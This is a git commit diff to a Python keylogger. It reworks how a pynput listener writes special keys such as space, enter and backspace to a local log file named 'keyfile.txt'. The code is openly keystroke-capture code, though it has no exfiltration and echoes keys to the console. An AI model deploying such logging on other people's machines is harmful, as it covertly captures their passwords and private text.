f650d56e8c653461a6316989b4d7ec12de3bd8fa
JayAlton <32560528+JayAlton@users.noreply.github.com>
2024-12-16 17:15:46 -0800

    fixed special characters

--- keylogger.py
+++ keylogger.py
@@ -4,26 +4,25 @@ def keyPressed(key):
     print(str(key))
     with open("keyfile.txt", 'a') as logKey:
         try:
+            # Check if the key has a char attribute (i.e., it's a regular key)
             char = key.char
             if char:
                 logKey.write(char)
-            else:
-                # Handle special keys like space, backspace, and enter
-                if key == keyboard.Key.space:
-                    logKey.write(' ')
-                elif key == keyboard.Key.backspace:
-                    logKey.write(' [BACKSPACE] ')
-                elif key == keyboard.Key.enter:
-                    logKey.write(' [ENTER] ')
-                elif key == keyboard.Key.shift:
-                    logKey.write(' [SHIFT] ')
-                elif key == keyboard.Key.caps_lock:
-                    logKey.write(' [CAPS_LOCK] ')
-                else:
-                    # For any other special keys, write their name
-                    logKey.write(f' [{key}] ')
         except AttributeError:
-            print("Error getting char")
+            # Handle special keys
+            if key == keyboard.Key.space:
+                logKey.write(' ')
+            elif key == keyboard.Key.backspace:
+                logKey.write(' [BACKSPACE] ')
+            elif key == keyboard.Key.enter:
+                logKey.write('\n')
+            elif key == keyboard.Key.shift:
+                logKey.write(' [SHIFT] ')
+            elif key == keyboard.Key.caps_lock:
+                logKey.write(' [CAPS_LOCK] ')
+            else:
+                # For other special keys, write their name
+                logKey.write(f' [{key}] ')
 
 if __name__ == "__main__":
     listener = keyboard.Listener(on_press=keyPressed)
